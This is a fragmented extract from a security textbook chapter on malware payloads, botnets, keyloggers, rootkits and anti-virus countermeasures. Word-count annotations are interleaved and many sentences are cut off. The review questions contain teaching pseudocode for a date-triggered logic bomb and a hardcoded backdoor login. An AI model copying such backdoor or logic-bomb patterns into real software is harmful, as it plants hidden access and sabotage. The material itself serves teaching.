the attacker could not accomplish directly. For example, to gain access to sensitive,
[Word Count: 24]

Trojan horses fit into one of three models:
[Word Count: 8]

• Continuing to perform the function of the original program and additionally
[Word Count: 12]

performing a separate malicious activity.
 
• Continuing to perform the function of the original program but modifying the
[Word Count: 18]

function to perform malicious activity (e.g., a Trojan horse version of a login 
program that collects passwords) or to disguise other malicious activity (e.g., a 
Trojan horse version of a process listing program that does not display certain 
processes that are malicious).
 
• Performing a malicious function that completely replaces the function of the
[Word Count: 54]

Some Trojans avoid the requirement for user assistance by exploiting some software 
vulnerability to enable their automatic installation and execution. In this they share 
some features of a worm, but unlike it, they do not replicate. A prominent example 
of such an attack was the Hydraq Trojan used in Operation Aurora in 2009 and early 
2010. This exploited a vulnerability in Internet Explorer to install itself, and targeted 
several high-profile companies [SYMA13]. It was typically ­distributed using either 
spam e-mail or via a compromised Web site using a “watering-hole” attack.
[Word Count: 90]

Mobile phone Trojans also first appeared in 2004 with the discovery of Skuller. As 
with mobile worms, the target is the smartphone, and the early mobile Trojans tar-
geted Symbian phones. More recently, a significant number of Trojans have been 
detected that target Android phones and Apple iPhones. These Trojans are usually 
distributed via one or more of the app marketplaces for the target phone O/S.
[Word Count: 66]

Once malware is active on the target system, the next concern is what actions it 
will take on this system. That is, what payload does it carry. Some malware has a 
­nonexistent or nonfunctional payload. Its only purpose, either deliberate or due to 
accidental early release, is to spread. More commonly, it carries one or more ­payloads 
that ­perform covert actions for the attacker.
[Word Count: 64]

An early payload seen in a number of viruses and worms resulted in data 
destruction on the infected system when certain trigger conditions were met 
[WEAV03]. A related payload is one that displays unwanted messages or content 
on the user’s system when triggered. More seriously, another variant attempts to 
inflict real-world damage on the system. All of these actions target the integrity of 
the computer system’s software or hardware, or of the user’s data. These changes 
may not occur immediately, but only when specific trigger conditions are met that 
satisfy their logic-bomb code.
[Word Count: 93]

The Chernobyl virus is an early example of a destructive parasitic memory-resident 
Windows-95 and 98 virus, that was first seen in 1998. It infects executable files when 
they are opened. And when a trigger date is reached, it deletes data on the infected 
system by overwriting the first megabyte of the hard drive with zeroes, resulting in 
massive corruption of the entire file system. This first occurred on April 26, 1999, 
when estimates suggest more than one million computers were affected.
[Word Count: 81]

Similarly, the Klez mass-mailing worm is an early example of a destructive 
worm infecting Windows-95 to XP systems, and was first seen in October 2001. It 
spreads by e-mailing copies of itself to addresses found in the address book and in 
files on the system. It can stop and delete some anti-virus programs running on the 
system. On trigger dates, being the 13th of several months each year, it causes files 
on the local hard drive to become empty.
[Word Count: 79]

As an alternative to just destroying data, some malware encrypts the user’s 
data, and demands payment in order to access the key needed to recover this 
information. This is sometimes known as ransomware. The PC Cyborg Trojan 
seen in 1989 was an early example of this. However, around mid-2006, a number 
of worms and Trojans appeared, such as the Gpcode Trojan, that used public-key
[Word Count: 64]

cryptography with increasingly larger key sizes to encrypt data. The user needed 
to pay a ­ransom, or to make a purchase from certain sites, in order to receive the 
key to decrypt this data. While earlier instances used weaker cryptography that 
could be cracked without paying the ransom, the later versions using public-key 
cryptography with large key sizes could not be broken this way. [SYMA13] notes 
that ransomware is a growing challenge, often spread via “drive-by-downloads.”
[Word Count: 76]

A further variant of system corruption payloads aims to cause damage to ­physical 
equipment. The infected system is clearly the device most easily targeted. The 
­Chernobyl virus mentioned above not only corrupts data, but attempts to rewrite 
the BIOS code used to initially boot the computer. If it is successful, the boot ­process 
fails, and the system is unusable until the BIOS chip is either re-programmed or 
replaced.
[Word Count: 68]

A key component of data-corrupting malware is the logic bomb. The logic bomb is 
code embedded in the malware that is set to “explode” when certain conditions are 
met. Examples of conditions that can be used as triggers for a logic bomb are the pres-
ence or absence of certain files or devices on the system, a particular day of the week 
or date, a particular version or configuration of some software, or a particular user 
running the application. Once triggered, a bomb may alter or delete data or entire files, 
cause a machine halt, or do some other damage.
[Word Count: 100]

A striking example of how logic bombs can be employed was the case of Tim 
Lloyd, who was convicted of setting a logic bomb that cost his employer, Omega 
Engineering, more than $10 million, derailed its corporate growth strategy, and 
eventually led to the layoff of 80 workers [GAUD00]. Ultimately, Lloyd was 
­sentenced to 41 months in prison and ordered to pay $2 million in restitution.
[Word Count: 66]

The next category of payload we discuss is where the malware subverts the compu-
tational and network resources of the infected system for use by the attacker. Such a 
system is known as a bot (robot), zombie or drone, and secretly takes over another 
Internet-attached computer and then uses that computer to launch or manage
[Word Count: 55]

6.7 / Payload—Attack Agent—Zombie, Bots   223
[Word Count: 6]

attacks that are difficult to trace to the bot’s creator. The bot is typically planted on 
hundreds or thousands of computers belonging to unsuspecting third parties. The 
collection of bots often is capable of acting in a coordinated manner; such a collec-
tion is referred to as a botnet. This type of payload attacks the integrity and avail-
ability of the infected system.
[Word Count: 63]

[HONE05] lists the following uses of bots:
[Word Count: 7]

• Distributed denial-of-service (DDoS) attacks: A DDoS attack is an attack on
[Word Count: 12]

a computer system or network that causes a loss of service to users. We exam-
ine DDoS attacks in Chapter 7.
 
• Spamming: With the help of a botnet and thousands of bots, an attacker is able
[Word Count: 37]

to send massive amounts of bulk e-mail (spam).
 
• Sniffing traffic: Bots can also use a packet sniffer to watch for interesting clear-
[Word Count: 23]

text data passing by a compromised machine. The sniffers are mostly used to 
retrieve sensitive information like usernames and passwords.
 
• Keylogging: If the compromised machine uses encrypted communication
[Word Count: 29]

channels (e.g. HTTPS or POP3S), then just sniffing the network packets on 
the victim’s computer is useless because the appropriate key to decrypt the 
packets is missing. But by using a keylogger, which captures keystrokes on the 
infected machine, an attacker can retrieve sensitive information.
 
• Spreading new malware: Botnets are used to spread new bots. This is very
[Word Count: 59]

easy since all bots implement mechanisms to download and execute a file via 
HTTP or FTP. A botnet with 10,000 hosts that acts as the start base for a 
worm or mail virus allows very fast spreading and thus causes more harm.
 
• Installing advertisement add-ons and browser helper objects (BHOs): Botnets
[Word Count: 52]

net Relay Chat (IRC) networks. Popular among attackers is especially the so-
called clone attack: In this kind of attack, the controller orders each bot to 
connect a large number of clones to the victim IRC network. The victim is 
flooded by service requests from thousands of bots or thousands of channel-
joins by these cloned bots. In this way, the victim IRC network is brought 
down, similar to a DDoS attack.
 
• Manipulating online polls/games: Online polls/games are getting more and
[Word Count: 82]

more attention and it is rather easy to manipulate them with botnets. Since 
every bot has a distinct IP address, every vote will have the same credibility as 
a vote cast by a real person. Online games can be manipulated in a similar way.
[Word Count: 44]

The remote control facility is what distinguishes a bot from a worm. A worm propa-
gates itself and activates itself, whereas a bot is controlled by some form of command- 
and-control (C&C) server network. This contact does not need to be continuous, 
but can be initiated periodically when the bot observes it has network access.
[Word Count: 55]

An early means of implementing the remote control facility used an IRC 
server. All bots join a specific channel on this server and treat incoming messages 
as commands. More recent botnets tend to avoid IRC mechanisms and use covert 
communication channels via protocols such as HTTP. Distributed control mecha-
nisms, using peer-to-peer protocols, are also used, to avoid a single point of failure.
[Word Count: 63]

6.8	 Payload—Information Theft—Keyloggers,
[Word Count: 3]

We now consider payloads where the malware gathers data stored on the infected 
system for use by the attacker. A common target is the user’s login and password 
credentials to banking, gaming, and related sites, which the attacker then uses to 
impersonate the user to access these sites for gain. Less commonly, the payload may 
target documents or system configuration details for the purpose of reconnaissance 
or espionage. These attacks target the confidentiality of this information.
[Word Count: 76]

Credential Theft, Keyloggers, and Spyware
[Word Count: 5]

Typically, users send their login and password credentials to banking, gaming, and 
related sites over encrypted communication channels (e.g., HTTPS or POP3S), 
which protects them from capture by monitoring network packets. To bypass this,
[Word Count: 34]

6.8 / Payload—Information Theft—Keyloggers, Phishing, Spyware   225
[Word Count: 7]

an attacker can install a keylogger, which captures keystrokes on the infected 
machine to allow an attacker to monitor this sensitive information. Since this would 
result in the attacker receiving a copy of all text entered on the compromised 
machine, ­keyloggers typically implement some form of filtering mechanism that 
only returns information close to desired keywords (e.g., “login” or “password” or 
­“paypal.com”).
[Word Count: 62]

The Zeus banking Trojan, created from its crimeware toolkit, is a prominent 
example of such spyware that has been widely deployed in recent years [BINS10]. 
It steals banking and financial credentials using both a keylogger and capturing and 
possibly altering form data for certain Web sites. It is typically deployed using either 
spam e-mails or via a compromised Web site in a “drive-by-download.”
[Word Count: 63]

More generally, such a spam e-mail may direct a user to a fake Web site 
­controlled by the attacker, or to complete some enclosed form and return to an e-mail 
accessible to the attacker, which is used to gather a range of private, personal, infor-
mation on the user. Given sufficient details, the attacker can then “assume” the user’s 
identity for the purpose of obtaining credit, or sensitive access to other resources. 
This is known as a phishing attack and exploits social engineering to leverage user’s 
trust by masquerading as communications from a trusted source [GOLD10].
[Word Count: 96]

Such general spam e-mails are typically widely distributed to very large num-
bers of users, often via a botnet. While the content will not match appropriate 
trusted sources for a significant fraction of the recipients, the attackers rely on it 
reaching sufficient users of the named trusted source, a gullible portion of whom 
will respond, for it to be profitable.
[Word Count: 60]

A more dangerous variant of this is the spear-phishing attack. This again is an 
e-mail claiming to be from a trusted source. However, the recipients are carefully 
researched by the attacker, and each e-mail is carefully crafted to suit its recipient
[Word Count: 41]

specifically, often quoting a range of information to convince them of its authentic-
ity. This greatly increases the likelihood of the recipient responding as desired by the 
attacker. This type of attack is particularly used in industrial and other forms of espio-
nage by well-resourced organizations [SYMA13].
[Word Count: 47]

Reconnaissance, Espionage and Data Exfiltration
[Word Count: 5]

APT attacks may result in the loss of large volumes of sensitive information, 
which is sent, exfiltrated from the target organization, to the attackers. To detect 
and block such data exfiltration requires suitable “data-loss” technical counter-
measures that manage either access to such information, or its transmission across 
the organization’s network perimeter.
[Word Count: 52]

6.9	 Payload—Stealthing—Backdoors, Rootkits
[Word Count: 3]

The final category of payload we discuss concerns techniques used by malware to 
hide its presence on the infected system, and to provide covert access to that system. 
This type of payload also attacks the integrity of the infected system.
[Word Count: 40]

Backdoors become threats when unscrupulous programmers use them to 
gain unauthorized access. The backdoor was the basic idea for the vulnerability 
­portrayed in the movie War Games. Another example is that during the develop-
ment of Multics, penetration tests were conducted by an Air Force “tiger team”
[Word Count: 47]

6.9 / Payload—Stealthing—Backdoors, Rootkits   227
[Word Count: 5]

(simulating adversaries). One tactic employed was to send a bogus operating system 
update to a site running Multics. The update contained a Trojan horse that could be 
activated by a backdoor and that allowed the tiger team to gain access. The threat 
was so well implemented that the Multics developers could not find it, even after 
they were informed of its presence [ENGE80].
[Word Count: 63]

In more recent times, a backdoor is usually implemented as a network ­service 
listening on some non-standard port that the attacker can connect to and issue 
­commands through to be run on the compromised system.
[Word Count: 35]

It is difficult to implement operating system controls for backdoors in 
­applications. Security measures must focus on the program development and 
­software update activities, and on programs that wish to offer a network service.
[Word Count: 34]

A rootkit is a set of programs installed on a system to maintain covert access to that 
system with administrator (or root)3 privileges, while hiding evidence of its pres-
ence to the greatest extent possible. This provides access to all the functions and 
services of the operating system. The rootkit alters the host’s standard functionality 
in a malicious and stealthy way. With root access, an attacker has complete control 
of the system and can add or change programs and files, monitor processes, send and 
receive network traffic, and get backdoor access on demand.
[Word Count: 93]

A rootkit can make many changes to a system to hide its existence, ­making 
it difficult for the user to determine that the rootkit is present and to identify what 
changes have been made. In essence, a rootkit hides by subverting the mechanisms 
that monitor and report on the processes, files, and registries on a computer.
[Word Count: 56]

A rootkit can be classified using the following characteristics:
[Word Count: 9]

• Persistent: Activates each time the system boots. The rootkit must store code
[Word Count: 13]

in a persistent store, such as the registry or file system, and configure a method 
by which the code executes without user intervention. This means it is easier 
to detect, as the copy in persistent storage can potentially be scanned.
 
• Memory based: Has no persistent code and therefore cannot survive a reboot.
[Word Count: 53]

However, because it is only in memory, it can be harder to detect.
 
• User mode: Intercepts calls to APIs (application program interfaces) and mod-
[Word Count: 25]

ifies returned results. For example, when an application performs a directory 
listing, the return results do not include entries identifying the files associated 
with the rootkit.
 
• Kernel mode: Can intercept calls to native APIs in kernel mode.4 The root-
[Word Count: 40]

kit can also hide the presence of a malware process by removing it from the 
­kernel’s list of active processes.
 
• Virtual machine based: This type of rootkit installs a lightweight virtual
[Word Count: 32]

machine monitor, and then runs the operating system in a virtual machine
[Word Count: 12]

3On UNIX systems, the administrator, or superuser, account is called root; hence the term root access.
4The kernel is the portion of the OS that includes the most heavily used and most critical portions of 
software. Kernel mode is a privileged mode of execution reserved for the kernel. Typically, kernel mode 
allows access to regions of main memory that are unavailable to processes executing in a less privileged 
mode and also enables execution of certain machine instructions that are restricted to the kernel mode.
[Word Count: 84]

above it. The rootkit can then transparently intercept and modify states and 
events occurring in the virtualized system.
 
• External mode: The malware is located outside the normal operation mode
[Word Count: 30]

of the targeted system, in BIOS or system management mode, where it can 
directly access hardware.
[Word Count: 16]

This classification shows a continuing arms race between rootkit authors, who 
exploit ever more stealthy mechanisms to hide their code, and those who develop 
mechanisms to harden systems against such subversion, or to detect when it has 
occurred. Much of this advance is associated with finding “layer-below” forms of 
attack. The early rootkits worked in user mode, modifying utility programs and 
libraries in order to hide their presence. The changes they made could be detected 
by code in the kernel, as this operated in the layer below the user. Later-generation 
rootkits used more stealthy techniques, as we discuss next.
[Word Count: 99]

The next generation of rootkits moved down a layer, making changes inside the 
kernel and co-existing with the operating systems code, in order to make their 
detection much harder. Any “anti-virus” program would now be subject to the 
same “low-level” modifications that the rootkit uses to hide its presence. However, 
methods were developed to detect these changes.
[Word Count: 57]

[LEVI06] lists three techniques that can be used to change system calls:
[Word Count: 12]

• Modify the system call table: The attacker modifies selected syscall addresses
[Word Count: 12]

stored in the system call table. This enables the rootkit to direct a system call 
away from the legitimate routine to the rootkit’s replacement. Figure 6.4 
shows how the knark rootkit achieves this.
 
• Modify system call table targets: The attacker overwrites selected legitimate
[Word Count: 44]

system call routines with malicious code. The system call table is not changed.
[Word Count: 13]

• Redirect the system call table: The attacker redirects references to the entire
[Word Count: 13]

system call table to a new table in a new kernel memory location.
[Word Count: 13]

Virtual Machine and Other External Rootkits
[Word Count: 6]

The latest generation of rootkits uses code that is entirely invisible to the targeted 
operating system. This can be done using a rogue or compromised virtual machine 
monitor or hypervisor, often aided by the hardware virtualization support provided 
in recent processors. The rootkit code then runs entirely below the visibility of even 
kernel code in the targeted operating system, which is now unknowingly running in
[Word Count: 65]

a virtual machine, and capable of being silently monitored and attacked by the code 
below [SKAP07].
[Word Count: 16]

Several prototypes of virtualized rootkits were demonstrated in 2006. SubVirt 
attacked Windows systems running under either Microsoft’s Virtual PC or VMware 
Workstation hypervisors by modifying the boot process they used. These changes 
did make it possible to detect the presence of the rootkit.
[Word Count: 43]

However, the Blue Pill rootkit was able to subvert a native Windows Vista 
­system by installing a thin hypervisor below it, and then seamlessly continuing 
­execution of the Vista system in a virtual machine. As it only required the execu-
tion of a rogue driver by the Vista kernel, this rootkit could install itself while the 
targeted system was running, and is much harder to detect. This type of rootkit is a 
particular threat to systems running on modern processors with hardware virtualiza-
tion ­support, but where no hypervisor is in use.
[Word Count: 92]

Other variants exploit the System Management Mode (SMM)5 in Intel proc-
essors that is used for low-level hardware control, or the BIOS code used when the 
processor first boots. Such code has direct access to attached hardware devices, and 
is generally invisible to code running outside these special modes [EMBL08].
[Word Count: 50]

To defend against these types of rootkits, the entire boot process must be secure, 
ensuring that the operating system is loaded and secured against the ­installation of 
these types of malicious code. This needs to include monitoring the loading of any 
hypervisor code to ensure it is legitimate. We discuss this further in Chapter 12.
[Word Count: 55]

We now consider possible countermeasures for malware. These are generally known 
as “anti-virus” mechanisms, as they were first developed to specifically target virus 
infections. However, they have evolved to address most of the types of malware we 
discuss in this chapter.
[Word Count: 41]

(a) Normal kernel memory layout
(b) After knark install
[Word Count: 9]

knark_fork( )
knark_read( )
knark_execve( )
[Word Count: 6]

Figure 6.4  System Call Table Modification by Rootkit
[Word Count: 8]

5The System Management Mode (SMM) is a relatively obscure mode on Intel processors used for 
­low-level hardware control, with its own private memory space and execution environment, that is gener-
ally invisible to code running outside (e.g., in the operating system).
[Word Count: 41]

The ideal solution to the threat of malware is prevention: Do not allow malware to 
get into the system in the first place, or block the ability of it to modify the ­system. 
This goal is, in general, nearly impossible to achieve, although taking suitable 
­countermeasures to harden systems and users in preventing infection can signifi-
cantly reduce the number of successful malware attacks. [SOUP13] suggests there 
are four main elements of prevention: policy, awareness, vulnerability mitigation, 
and threat mitigation. Having a suitable policy to address malware prevention pro-
vides a basis for implementing appropriate preventative countermeasures.
[Word Count: 97]

The third common propagation mechanism, which targets users in a social 
­engineering attack, can be countered using appropriate user awareness and train-
ing. This aims to equip users to be more aware of these attacks, and less likely to 
take actions that result in their compromise. [SOUP13] provides examples of suitable 
awareness issues. We return to this topic in Chapter 17.
[Word Count: 61]

If prevention fails, then technical mechanisms can be used to support the 
­following threat mitigation options:
[Word Count: 16]

• Detection: Once the infection has occurred, determine that it has occurred
[Word Count: 12]

and locate the malware.
 
• Identification: Once detection has been achieved, identify the specific ­malware
[Word Count: 15]

that has infected the system.
 
• Removal: Once the specific malware has been identified, remove all traces of
[Word Count: 18]

malware virus from all infected systems so that it cannot spread further.
[Word Count: 12]

If detection succeeds but either identification or removal is not possible, then the 
alternative is to discard any infected or malicious files and reload a clean backup 
­version. In the case of some particularly nasty infections, this may require a com-
plete wipe of all storage, and rebuild of the infected system from known clean 
media.
[Word Count: 56]

To begin, let us consider some requirements for effective malware 
countermeasures:
[Word Count: 11]

• Generality: The approach taken should be able to handle a wide variety of
[Word Count: 14]

• Timeliness: The approach should respond quickly so as to limit the number of
[Word Count: 14]

infected programs or systems and the consequent activity.
 
• Resiliency: The approach should be resistant to evasion techniques employed
[Word Count: 19]

by attackers to hide the presence of their malware.
[Word Count: 9]

• Minimal denial-of-service costs: The approach should result in minimal reduc-
[Word Count: 11]

tion in capacity or service due to the actions of the countermeasure software, 
and should not significantly disrupt normal operation.
 
• Transparency: The countermeasure software and devices should not require
[Word Count: 30]

modification to existing (legacy) OSs, application software, and hardware.
 
• Global and local coverage: The approach should be able to deal with attack
[Word Count: 23]

sources both from outside and inside the enterprise network.
[Word Count: 9]

Achieving all these requirements often requires the use of multiple approaches, in a 
defense-in-depth strategy.
[Word Count: 15]

[STEP93] identifies four generations of anti-virus software:
[Word Count: 7]

• First generation: simple scanners
 
• Second generation: heuristic scanners
[Word Count: 10]

• Third generation: activity traps
 
• Fourth generation: full-featured protection
[Word Count: 10]

A first-generation scanner requires a malware signature to identify the ­malware. 
The signature may contain “wildcards” but matches essentially the same structure 
and bit pattern in all copies of the malware. Such signature-specific ­scanners are 
limited to the detection of known malware. Another type of first-generation scanner 
maintains a record of the length of programs and looks for changes in length as a 
result of virus infection.
[Word Count: 67]

A second-generation scanner does not rely on a specific signature. Rather, the 
scanner uses heuristic rules to search for probable malware instances. One class of 
such scanners looks for fragments of code that are often associated with malware. 
For example, a scanner may look for the beginning of an encryption loop used in a 
polymorphic virus and discover the encryption key. Once the key is discovered, the 
scanner can decrypt the malware to identify it, then remove the infection and return 
the program to service.
[Word Count: 85]

Third-generation programs are memory-resident programs that identify mal-
ware by its actions rather than its structure in an infected program. Such ­programs 
have the advantage that it is not necessary to develop signatures and heuristics for 
a wide array of malware. Rather, it is necessary only to identify the small set of 
actions that indicate malicious activity is being attempted and then to intervene.
[Word Count: 64]

Fourth-generation products are packages consisting of a variety of anti-virus 
techniques used in conjunction. These include scanning and activity trap compo-
nents. In addition, such a package includes access control capability, which limits 
the ability of malware to penetrate a system and then limits the ability of a malware 
to update files in order to propagate.
[Word Count: 56]

The arms race continues. With fourth-generation packages, a more compre-
hensive defense strategy is employed, broadening the scope of defense to more 
­general-purpose computer security measures. These include more sophisticated 
anti-virus approaches. We now highlight two of the most important.
[Word Count: 40]

Generic Decryption  Generic decryption (GD) technology enables the anti-
virus program to easily detect even the most complex polymorphic viruses and other 
malware, while maintaining fast scanning speeds [NACH97]. Recall that when a file 
containing a polymorphic virus is executed, the virus must decrypt itself to activate. 
In order to detect such a structure, executable files are run through a GD scanner, 
which contains the following elements:
[Word Count: 67]

• CPU emulator: A software-based virtual computer. Instructions in an execut-
[Word Count: 11]

able file are interpreted by the emulator rather than executed on the underlying 
processor. The emulator includes software versions of all registers and other 
processor hardware, so that the underlying processor is unaffected by programs 
interpreted on the emulator.
 
• Virus signature scanner: A module that scans the target code looking for
[Word Count: 52]

known malware signatures.
 
• Emulation control module: Controls the execution of the target code.
[Word Count: 14]

At the start of each simulation, the emulator begins interpreting instructions 
in the target code, one at a time. Thus, if the code includes a decryption routine 
that decrypts and hence exposes the malware, that code is interpreted. In effect, the 
malware does the work for the anti-virus program by exposing itself. Periodically, 
the control module interrupts interpretation to scan the target code for malware 
signatures.
[Word Count: 66]

During interpretation, the target code can cause no damage to the actual 
­personal computer environment, because it is being interpreted in a completely 
controlled environment.
[Word Count: 25]

The most difficult design issue with a GD scanner is to determine how long 
to run each interpretation. Typically, malware elements are activated soon after 
a program begins executing, but this need not be the case. The longer the scanner 
emulates a particular program, the more likely it is to catch any hidden malware. 
However, the anti-virus program can take up only a limited amount of time and 
resources before users complain of degraded system performance.
[Word Count: 76]

Host-Based Behavior-Blocking Software  Unlike heuristics or fingerprint-
based scanners, behavior-blocking software integrates with the operating system of 
a host computer and monitors program behavior in real time for malicious actions 
[CONR02, NACH02]. It is a type of host-based intrusion prevention system, 
which we discuss further in Section 9.6. The behavior blocking software then 
blocks potentially malicious actions before they have a chance to affect the system. 
Monitored behaviors can include:
[Word Count: 70]

• Attempts to open, view, delete, and/or modify files;
 
• Attempts to format disk drives and other unrecoverable disk operations;
 
• Modifications to the logic of executable files or macros;
 
• Modification of critical system settings, such as start-up settings;
 
• Scripting of e-mail and instant messaging clients to send executable
[Word Count: 51]

content; and
 
• Initiation of network communications.
[Word Count: 7]

Because a behavior blocker can block suspicious software in real time, it has an 
advantage over such established anti-virus detection techniques as fingerprinting or 
heuristics. There are literally trillions of different ways to obfuscate and rearrange the 
instructions of a virus or worm, many of which will evade detection by a fingerprint 
scanner or heuristic. But eventually, malicious code must make a well-defined request 
to the operating system. Given that the behavior blocker can intercept all such 
requests, it can identify and block malicious actions regardless of how ­obfuscated the 
program logic appears to be.
[Word Count: 95]

Behavior blocking alone has limitations. Because the malicious code must 
run on the target machine before all its behaviors can be identified, it can cause 
harm before it has been detected and blocked. For example, a new item of malware 
might shuffle a number of seemingly unimportant files around the hard drive before 
modifying a single file and being blocked. Even though the actual modification was 
blocked, the user may be unable to locate his or her files, causing a loss to produc-
tivity or possibly worse.
[Word Count: 87]

Spyware Detection and Removal  Although general anti-virus products include 
signatures to detect spyware, the threat this type of malware poses, and its use of 
stealthing techniques, means that a range of spyware specific detection and removal 
utilities exist. These specialize in the detection and removal of spyware, and provide 
more robust capabilities. Thus they complement, and should be used along with, 
more general anti-virus products.
[Word Count: 65]

Rootkit Countermeasures  Rootkits can be extraordinarily difficult to detect 
and neutralize, particularly so for kernel-level rootkits. Many of the administrative 
tools that could be used to detect a rootkit or its traces can be compromised by the 
rootkit precisely so that it is undetectable.
[Word Count: 44]

Countering rootkits requires a variety of network- and computer-level secu-
rity tools. Both network-based and host-based IDSs can look for the code signa-
tures of known rootkit attacks in incoming traffic. Host-based anti-virus software 
can also be used to recognize the known signatures.
[Word Count: 43]

Of course, there are always new rootkits and modified versions of existing 
rootkits that display novel signatures. For these cases, a system needs to look for 
behaviors that could indicate the presence of a rootkit, such as the interception of 
system calls or a keylogger interacting with a keyboard driver. Such behavior detec-
tion is far from straightforward. For example, anti-virus software typically inter-
cepts system calls.
[Word Count: 67]

Another approach is to do some sort of file integrity check. An example of 
this is RootkitRevealer, a freeware package from SysInternals. The package com-
pares the results of a system scan using APIs with the actual view of storage using 
instructions that do not go through an API. Because a rootkit conceals itself by 
modifying the view of storage seen by administrator calls, RootkitRevealer catches 
the discrepancy.
[Word Count: 68]

If a kernel-level rootkit is detected, the only secure and reliable way to recover 
is to do an entire new OS install on the infected machine.
[Word Count: 26]

However, this approach is limited to scanning the malware content, as it does 
not have access to any behavior observed when it runs on an infected system. Two 
types of monitoring software may be used:
[Word Count: 35]

• Ingress monitors: These are located at the border between the enterprise
[Word Count: 12]

­network and the Internet. They can be part of the ingress filtering software 
of a border router or external firewall or a separate passive monitor. These
[Word Count: 26]

monitors can use either anomaly or signature and heuristic approaches to 
detect malware traffic, as we discuss further in Chapter 8. A ­honeypot can also 
capture incoming malware traffic. An example of a detection ­technique for an 
ingress monitor is to look for incoming traffic to unused local IP addresses.
 
• Egress monitors: These can be located at the egress point of individual LANs
[Word Count: 64]

Perimeter monitoring can also assist in detecting and responding to botnet ­activity 
by detecting abnormal traffic patterns associated with this activity. Once bots are 
activated and an attack is underway, such monitoring can be used to detect the 
attack. However, the primary objective is to try to detect and disable the botnet 
during its construction phase, using the various scanning techniques we have just 
discussed, identifying and blocking the malware that is used to propagate this type 
of payload.
[Word Count: 79]

Distributed Intelligence Gathering Approaches
[Word Count: 4]

The final location where anti-virus software is used is in a distributed configuration. 
It gathers data from a large number of both host-based and perimeter sensors, relays 
this intelligence to a central analysis system able to correlate and analyze the data, 
which can then return updated signatures and behavior patterns to enable all of the 
coordinated systems to respond and defend against malware attacks. A number of 
such systems have been proposed. This is a specific example of a distributed intrusion 
prevention system (IPS), targeting malware, which we discuss further in Section 9.6.
[Word Count: 93]

For a thorough understanding of viruses, the book to read is [SZOR05]. Another 
excellent treatment is [AYCO06]. Good overview articles on viruses and worms are 
[CASS01], [KEPH97a], and [NACH97]. [MOOR02] provides a good treatment of 
the Code Red worm. [WEAV03] supplies a comprehensive survey of worm charac-
teristics. [HYPP06] discusses worm attacks on mobile phones.
[Word Count: 55]

[HOLZ05] and [MCLA04] provide overviews of bots. [LEVI06], [LEVI04], 
[GEER06], and [EMBL08] describe various types of rootkits and their operation.
[Word Count: 20]

[SOUP13] provides guidance on malware prevention and handling.
[Word Count: 8]

6.12	Key Terms, Review Questions, and Problems
[Word Count: 7]

Spread and Victims of an Internet Worm.” Proceedings of the 2nd ACM 
­SIGCOMM Workshop on Internet Measurement, November 2002.
NACH97	
Nachenberg, C. “Computer Virus-Antivirus Coevolution.” Communications 
of the ACM, January 1997.
SOUP13	
Souppaya, M., and Scarfone, K. Guide to Malware Incident Prevention and Han-
dling for Desktops and Laptops. NIST Special Publication SP 800-83, July 2013.
SYMA13	
Symantec, “Internet Security Threat Report, Vol. 18.” April 2013.
SZOR05	
Szor, P. The Art of Computer Virus Research and Defense. Reading, MA: 
Addison-Wesley, 2005.
WEAV03	 Weaver, N., et al. “A Taxonomy of Computer Worms.” The First ACM
[Word Count: 94]

Workshop on Rapid Malcode (WORM), 2003.
ZHOU12	 Zhou, Y.; and Jiang, X. “Dissecting Android Malware: Characterization and
[Word Count: 17]

Evolution” Proceedings of the 33rd IEEE Symposium on Security and Pri-
vacy, May 2012.
[Word Count: 14]

advanced persistent threat
adware
attack kit
backdoor
[Word Count: 7]

blended attack
boot-sector infector
bot
botnet
[Word Count: 6]

crimeware
data exfiltration
downloader
drive-by-download
[Word Count: 5]

6.12 / Key Terms, Review Questions, and Problems   237
[Word Count: 9]

6.1	
There is a flaw in the virus program of Figure 6.1a. What is it?
	 6.2	
The question arises as to whether it is possible to develop a program that can analyze 
a piece of software to determine if it is a virus. Consider that we have a program D 
that is supposed to be able to do that. That is, for any program P, if we run D(P), the 
result returned is TRUE (P is a virus) or FALSE (P is not a virus). Now consider the 
following program:
[Word Count: 90]

Program CV :=
    {. . .
    main-program :=
          {if D(CV) then goto next:
                  else infect-executable;
          }
  next:
    }
[Word Count: 18]

e-mail virus
infection vector
keyloggers
logic bomb
macro virus
malicious software
malware
metamorphic virus
mobile code
[Word Count: 16]

parasitic virus
payload
phishing
polymorphic virus
propagate
ransomware
rootkit
scanning
spear-phishing
[Word Count: 11]

spyware
stealth virus
trapdoor
Trojan horse
virus
watering-hole attack
worm
zombie
zero-day exploit
[Word Count: 13]

In the preceding program, infect-executable is a module that scans memory for 
­executable programs and replicates itself in those programs. Determine if D can 
­correctly decide whether CV is a virus.
	 6.3	
The following code fragments show a sequence of virus instructions and a meta-
morphic version of the virus. Describe the effect produced by the metamorphic 
code.
[Word Count: 58]

Original Code
Metamorphic Code
mov  eax, 5
add  eax, ebx
call  [eax]
[Word Count: 12]

mov  eax, 5
push  ecx
pop  ecx
add  eax, ebx
swap  eax, ebx
swap  ebx, eax
call  [eax]
nop
[Word Count: 19]

6.4	
The list of passwords used by the Morris worm is provided at this book’s Web site.
a.	 The assumption has been expressed by many people that this list represents words
[Word Count: 31]

commonly used as passwords. Does this seem likely? Justify your answer.
b.	 If the list does not reflect commonly used passwords, suggest some approaches
[Word Count: 24]

that Morris may have used to construct the list.
	 6.5	
Consider the following fragment:
[Word Count: 14]

legitimate code
  if data is Friday the 13th;
       crash_computer();
  legitimate code
[Word Count: 11]

What type of malware is this?
	 6.6	
Consider the following fragment in an authentication program:
[Word Count: 15]

username = read_username();
  password = read_password();
  if username is “133t h4ck0r”
       return ALLOW_LOGIN;
  if username and password are valid
       return ALLOW_LOGIN
  else return DENY_LOGIN
[Word Count: 24]

6.12 / Key Terms, Review Questions, and Problems   239
[Word Count: 9]

7.1	 Denial-of-Service Attacks
The Nature of Denial-of-Service Attacks
Classic Denial-of-Service Attacks
Source Address Spoofing
SYN Spoofing
[Word Count: 16]

7.2	 Flooding Attacks
ICMP Flood
UDP Flood
TCP SYN Flood
[Word Count: 10]

7.3	 Distributed Denial-of-Service Attacks
[Word Count: 4]

7.4	 Application-Based Bandwidth Attacks
SIP Flood
HTTP-Based Attacks
[Word Count: 8]

7.5	 Reflector and Amplifier Attacks
Reflection Attacks
Amplification Attacks
DNS Amplification Attacks
[Word Count: 12]

7.6	 Defenses Against Denial-of-Service Attacks
[Word Count: 5]

7.7	 Responding to a Denial-of-Service Attack
[Word Count: 6]

7.9	 Key Terms, Review Questions, and Problems
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Explain the basic concept of a denial-of-service attack.
